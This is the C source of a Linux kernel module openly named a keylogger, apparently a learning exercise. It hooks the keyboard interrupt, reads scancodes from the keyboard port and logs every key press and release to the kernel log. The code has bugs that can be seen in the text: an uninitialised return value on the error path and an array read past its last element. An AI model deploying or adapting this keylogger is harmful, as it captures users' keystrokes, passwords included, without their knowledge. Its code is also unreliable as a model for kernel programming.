#include "keylogger.h"

static void keyboard_tasklet(struct tasklet_struct *tasklet)
{
	unsigned char scancode;

	scancode = inb(KEYBOARD_PORT);
	unsigned char state = (scancode & RELEASED_MASK) ? 1 : 0;

	if (state)
	{
		pr_info("touche released [%x]\n", scancode);
		int i = 0;
		while (i < 70 && scancode != keycodes[i].released)
			i++;
		if (scancode != keycodes[i].released)
			pr_info("key not found\n");
//		else
//			pr_info("key = %s\n", keycodes[i].key);

	}
	else
	{
		pr_info("touche pressed [%x]\n", scancode);
		int i = 0;
		while (i < 70 && scancode != keycodes[i].pressed)
			i++;
		if (scancode != keycodes[i].pressed)
			pr_info("key not found\n");
//		else
//			pr_info("key = %s\n", keycodes[i].key);
	}

}

static irqreturn_t keyboard_interrupt(int irq, void *dev_id)
{
	tasklet_schedule(&kbd_tasklet);

	return IRQ_HANDLED;
}

static int __init initialization(void)
{
	int ret;

	if (request_irq(IRQ_NUM,
			keyboard_interrupt,
			IRQF_SHARED,
			IRQ_NAME,
			dev_id))
	{
		pr_err("keylogger: could not register irq: %d\n", ret);
		return ret;
	}

	pr_info("Keylogger: irq registered\n");
	return 0;
}

static void __exit cleanup(void)
{
	free_irq(IRQ_NUM, dev_id);
	tasklet_kill(&kbd_tasklet);
	pr_info("keylogger: irq freed\n");
}

module_init(initialization);
module_exit(cleanup);

